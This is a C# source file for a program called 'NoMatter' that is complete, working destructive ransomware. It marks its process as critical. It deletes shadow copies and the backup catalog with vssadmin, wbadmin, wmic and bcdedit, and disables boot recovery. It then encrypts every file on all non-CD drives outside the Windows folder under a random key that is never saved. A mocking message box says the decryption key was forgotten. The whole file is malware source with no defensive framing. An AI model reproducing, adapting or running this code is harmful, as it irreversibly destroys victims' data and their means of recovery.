using System;
using System.Buffers;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Threading;
using System.Threading.Channels;
using System.Threading.Tasks;


[assembly: AssemblyTitle("No even matter")]
[assembly: AssemblyDescription("Waiting...")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("Waiting...")]
[assembly: AssemblyProduct("Waiting...")]
[assembly: AssemblyCopyright("No one rights reserved.")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: ComVisible(false)]
[assembly: Guid("32c1176c-f625-4e2d-8c2f-7e9de8cec864")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: AssemblyInformationalVersion("goodluck with that")]

namespace NoMatter;

internal static class Program
{
    private static readonly string ExePath = Environment.ProcessPath ?? string.Empty;
    private static readonly string WindowsFolder = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
    
    private static readonly byte[] Key = RandomNumberGenerator.GetBytes(32);
    
    private static int _fileCount;
    private static int _processedCount;
    private static readonly Stopwatch Stopwatch = Stopwatch.StartNew();

    private const int NonceSize = 12;
    private const int TagSize = 16;
    private const int IvSize = 16;
    private const int BufferSize = 1_048_576;
    private const int SmallFileThreshold = 4_194_304;

    private const bool EnableLogging = false; // can be changed
    private static readonly string LogFilePath = Path.Combine(Path.GetTempPath(), "NoMatter.log");
    private static Channel<string>? LogChannel;
    private static Task? LogWriterTask;

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int MessageBoxW(IntPtr hWnd, string lpText, string lpCaption, uint uType);

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr Handle, int processInformationClass, ref int processInformation, int processInformationLength);

    private const uint MB_OK = 0x00000000;
    private const uint MB_ICONINFORMATION = 0x00000040;
    private const uint MB_TOPMOST = 0x00040000;

    public static async Task<int> Main(string[] args)
    {
        try
        {
            if (EnableLogging)
            {
                LogChannel = Channel.CreateUnbounded<string>(new UnboundedChannelOptions { SingleReader = true });
                LogWriterTask = Task.Run(() => ProcessLogQueueAsync());
                await Log($"=== NoMatter started at {DateTime.Now:yyyy-MM-dd HH:mm:ss} ===");
                await Log($"Executable: {ExePath}");
                await Log($"User: {Environment.UserName}");
                await Log($"Machine: {Environment.MachineName}");
            }

            Process.EnterDebugMode();
            int isCritical = 1;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
            await Log("Process marked as critical");

            await Log("Deleting shadow copies...");
            await DeleteShadowCopiesAsync().ConfigureAwait(false);
            await Log("Shadow copies deleted");

            await RunEncryptionAsync().ConfigureAwait(false);
            
            PrintFinalReport();
            await Log("Operation completed successfully");
            return 0;
        }
        catch (Exception ex)
        {
            await Log($"CRITICAL ERROR: {ex.GetType().Name}");
            await Log($"Message: {ex.Message}");
            await Log($"Stack trace:\n{ex.StackTrace}");
            
            if (ex.InnerException != null)
            {
                await Log($"Inner exception: {ex.InnerException.GetType().Name}");
                await Log($"Inner message: {ex.InnerException.Message}");
            }
            
            return -1;
        }
        finally
        {
            Stopwatch.Stop();
            
            int isCritical = 0;
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
            Process.LeaveDebugMode();
            
            if (EnableLogging && LogChannel != null)
            {
                await Log($"=== Operation finished. Total time: {Stopwatch.ElapsedMilliseconds}ms ===");
                LogChannel.Writer.Complete();
                if (LogWriterTask != null)
                {
                    await LogWriterTask;
                }
            }
        }
    }

    private static async Task Log(string message)
    {
        if (!EnableLogging || LogChannel == null) return;
        
        try
        {
            await LogChannel.Writer.WriteAsync($"[{DateTime.Now:HH:mm:ss.fff}] {message}");
        }
        catch
        {
        }
    }

    private static async Task ProcessLogQueueAsync()
    {
        try
        {
            using var writer = new StreamWriter(LogFilePath, append: false) { AutoFlush = true };
            
            await foreach (var message in LogChannel!.Reader.ReadAllAsync())
            {
                await writer.WriteLineAsync(message);
            }
        }
        catch
        {
        }
    }

    private static async Task DeleteShadowCopiesAsync()
    {
        var tasks = new List<Task>();

        tasks.Add(Task.Run(() => ExecuteCommand("vssadmin.exe", "delete shadows /all /quiet")));
        tasks.Add(Task.Run(() => ExecuteCommand("wbadmin.exe", "delete catalog -quiet")));

        var drives = DriveInfo.GetDrives()
            .Where(d => d.IsReady && d.DriveType == DriveType.Fixed)
            .Select(d => d.RootDirectory.FullName);

        foreach (var drive in drives)
        {
            var driveLetter = drive.TrimEnd('\\');
            tasks.Add(Task.Run(() => ExecuteCommand("wmic.exe", $"/namespace:\\\\root\\default path SystemRestore call Disable \"{driveLetter}\"")));
        }

        tasks.Add(Task.Run(() => ExecuteCommand("bcdedit.exe", "/set {default} bootstatuspolicy ignoreallfailures")));
        tasks.Add(Task.Run(() => ExecuteCommand("bcdedit.exe", "/set {default} recoveryenabled no")));

        await Task.WhenAll(tasks).ConfigureAwait(false);
    }

    private static async Task ExecuteCommand(string fileName, string arguments)
    {
        try
        {
            await Log($"Executing: {fileName} {arguments}");
            var processStartInfo = new ProcessStartInfo
            {
                FileName = fileName,
                Arguments = arguments,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            using var process = Process.Start(processStartInfo);
            process?.WaitForExit(30000);
            await Log($"Command completed: {fileName}");
        }
        catch (Exception ex)
        {
            await Log($"Command failed: {fileName} - {ex.Message}");
        }
    }

    private static void PrintFinalReport()
    {
        var processedCount = Interlocked.CompareExchange(ref _processedCount, 0, 0);
        var elapsedMs = Stopwatch.ElapsedMilliseconds;
        
        string line1 = $"Congratulations!11!! Encryption completed successfully, {processedCount} files were encrypted. Total time: {elapsedMs}ms.";
        string line2 = $"Your unique decryption key: oopss.. Actually I forgot it.. Well, try to fix it.. ";
        string line3 = $"possibly thats help, not sure..https://github.com/EZIKALEXANDR/NoMatter ";

        MessageBoxW(IntPtr.Zero, $"{line1}\n\n{line2}\n\n{line3}", "NoMatter", MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
    }

    private static async Task RunEncryptionAsync()
    {
        var files = new ConcurrentQueue<string>();
        var drives = DriveInfo.GetDrives()
            .Where(d => d.IsReady && d.DriveType != DriveType.CDRom)
            .Select(d => d.RootDirectory.FullName)
            .ToArray();

        if (drives.Length == 0)
        {
            await Log("No suitable drives found");
            return;
        }

        await Log($"Scanning {drives.Length} drives...");
        
        var collectTasks = drives.Select(drive => Task.Run(() => CollectFilesOptimized(drive, files))).ToArray();
        await Task.WhenAll(collectTasks).ConfigureAwait(false);

        var fileCount = files.Count;
        Interlocked.Exchange(ref _fileCount, fileCount);
        
        if (fileCount == 0)
        {
            await Log("No files found for processing");
            return;
        }

        await Log($"Found {fileCount} files for processing");

        var maxThreads = Math.Min(Environment.ProcessorCount * 2, 32);
        var parallelOptions = new ParallelOptions 
        { 
            MaxDegreeOfParallelism = maxThreads,
            CancellationToken = CancellationToken.None 
        };

        var partitioner = Partitioner.Create(files, EnumerablePartitionerOptions.NoBuffering);

        await Log($"Starting encryption with {maxThreads} threads...");

        await Task.Run(() =>
        {
            Parallel.ForEach(
                partitioner, 
                parallelOptions,
                () => RandomNumberGenerator.Create(),
                (file, state, localStateRng) =>    
                {
                    try
                    {
                        EncryptFileOptimized(file, localStateRng);
                        Interlocked.Increment(ref _processedCount);
                    }
                    catch (UnauthorizedAccessException) { }
                    catch (IOException) { }
                    catch (CryptographicException) { }
                    
                    return localStateRng;
                },
                localStateRng =>
                {
                    localStateRng.Dispose();
                });
        }, CancellationToken.None).ConfigureAwait(false);

        await Log($"Encryption completed. Processed: {Interlocked.CompareExchange(ref _processedCount, 0, 0)} files");
    }

    private static void CollectFilesOptimized(string rootPath, ConcurrentQueue<string> queue)
    {
        var stack = new Stack<string>();
        stack.Push(rootPath);

        while (stack.Count > 0)
        {
            var path = stack.Pop();
            
            if (path.StartsWith(WindowsFolder, StringComparison.OrdinalIgnoreCase))
                continue;

            try
            {
                foreach (var file in Directory.EnumerateFiles(path))
                {
                    if (ShouldSkipFile(file))
                        continue;
                    queue.Enqueue(file);
                }

                foreach (var dir in Directory.EnumerateDirectories(path))
                {
                    stack.Push(dir);
                }
            }
            catch
            {
            }
        }
    }

    [MethodImpl(MethodImplOptions.AggressiveInlining)]
    private static bool ShouldSkipFile(string filePath)
    {
        return filePath.Equals(ExePath, StringComparison.OrdinalIgnoreCase) ||
               filePath.EndsWith(".tmp", StringComparison.OrdinalIgnoreCase) ||
               filePath.EndsWith(".log", StringComparison.OrdinalIgnoreCase) ||
               filePath.EndsWith(".enc.tmp", StringComparison.OrdinalIgnoreCase);
    }

    private static void EncryptFileOptimized(string filePath, RandomNumberGenerator rng)
    {
        var fileInfo = new FileInfo(filePath);
        if (fileInfo.Length == 0)
            return;

        if (fileInfo.Length <= SmallFileThreshold)
        {
            EncryptSmallFileGCM(filePath, rng);
        }
        else
        {
            EncryptLargeFileCBC(filePath, rng);
        }
    }

    private static void EncryptSmallFileGCM(string filePath, RandomNumberGenerator rng)
    {
        var fileData = File.ReadAllBytes(filePath);
        
        Span<byte> nonce = stackalloc byte[NonceSize];
        Span<byte> tag = stackalloc byte[TagSize];
        rng.GetBytes(nonce);
        
        var encryptedData = new byte[fileData.Length];
        
        using var aes = new AesGcm(Key, TagSize);
        aes.Encrypt(nonce, fileData, encryptedData, tag, associatedData: default);
        
        using var fs = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.None, BufferSize, FileOptions.SequentialScan);
        fs.Write(nonce);
        fs.Write(tag);
        fs.Write(encryptedData);
    }

    private static void EncryptLargeFileCBC(string filePath, RandomNumberGenerator rng)
    {
        var tempPath = filePath + ".enc.tmp";
        var inputBuffer = ArrayPool<byte>.Shared.Rent(BufferSize);
        Span<byte> iv = stackalloc byte[IvSize];
        
        try
        {
            rng.GetBytes(iv);
            
            using var aes = Aes.Create();
            aes.KeySize = 256;
            aes.Key = Key;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            
            byte[] ivArray = iv.ToArray();
            using var encryptor = aes.CreateEncryptor(Key, ivArray);
            
            using var inputFile = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.Read, BufferSize, FileOptions.SequentialScan);
            using var outputFile = new FileStream(tempPath, FileMode.Create, FileAccess.Write, FileShare.None, BufferSize, FileOptions.SequentialScan);
            
            outputFile.Write(iv);
            
            using var cryptoStream = new CryptoStream(outputFile, encryptor, CryptoStreamMode.Write);
            
            int bytesRead;
            while ((bytesRead = inputFile.Read(inputBuffer, 0, BufferSize)) > 0)
            {
                cryptoStream.Write(inputBuffer, 0, bytesRead);
            }
            
            cryptoStream.FlushFinalBlock();
            
            inputFile.Close();
            outputFile.Close();
            
            File.Delete(filePath);
            File.Move(tempPath, filePath);
        }
        catch
        {
            try { if (File.Exists(tempPath)) File.Delete(tempPath); } catch { }
            throw;
        }
        finally
        {
            ArrayPool<byte>.Shared.Return(inputBuffer);
        }
    }
}
